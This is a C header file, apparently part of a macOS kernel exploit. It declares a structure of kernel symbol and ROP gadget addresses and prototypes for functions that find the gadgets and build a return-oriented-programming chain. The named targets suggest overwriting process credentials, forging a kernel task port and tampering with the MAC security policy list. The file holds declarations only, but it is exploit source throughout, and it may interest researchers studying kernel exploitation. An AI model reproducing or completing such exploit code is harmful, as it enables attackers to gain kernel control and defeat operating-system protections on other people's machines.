#ifndef ROP_H
#define ROP_H

#include <stdint.h>             // uint64_t

typedef struct
{
    // slid
    uint64_t OSObject_vtab;
    uint64_t OSObject_taggedRelease;
    uint64_t OSSerializer_serialize;
    //uint64_t IOMemoryDescriptor_withAddress;
    //uint64_t IOMemoryDescriptor_map;
    //uint64_t IOMemoryMap_getVirtualAddress;
    //uint64_t IOMultiMemoryDescriptor_withDescriptors;
    uint64_t kOSBooleanTrue;
    uint64_t current_proc;
    uint64_t proc_ucred;
    uint64_t posix_cred_get;
    uint64_t bzero;
    //uint64_t task_reference;
    //uint64_t convert_task_to_port;
    uint64_t vm_map_remap;
    uint64_t mach_vm_wire;
    uint64_t ipc_port_alloc_special;
    uint64_t ipc_kobject_set;
    uint64_t ipc_space_kernel;
    uint64_t kernel_map;
    uint64_t kernel_task;
    uint64_t realhost;
    uint64_t mac_policy_list;
    uint64_t hibernate_machine_init;
    uint64_t _hibernateStats;
    uint64_t add__rdi__ecx;
    uint64_t mov_rdi__rax_8__call__rax_;
    uint64_t mov_rsp_rsi_call_rdi;
    uint64_t add_rsp_0x28;
    uint64_t pop_rax;
    uint64_t pop_rdi;
    uint64_t pop_rsi;
    uint64_t pop_rdx;
    uint64_t pop_rcx;
    uint64_t pop_r8_pop_rbp;
    uint64_t mov_r9__rbp_0x38__call_rax;
    uint64_t push_rbp_mov_rax__rdi__pop_rbp;
    uint64_t mov_rax__rdi__pop_rbp;
    uint64_t mov__rdi__rax_pop_rbp;
    uint64_t mov_rdi_rax_pop_rbp_jmp_rcx;
    uint64_t mov_rsi_rax_pop_rbp_jmp_rcx;
    uint64_t mov_rdx_rax_pop_rbp_jmp_rcx;
    uint64_t sub_rax_rdi_pop_rbp;

    // unslid
    uint64_t taggedRelease_vtab_offset;
} rop_t;

int rop_gadgets(rop_t *rop, void *kernel);

void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr);

#endif
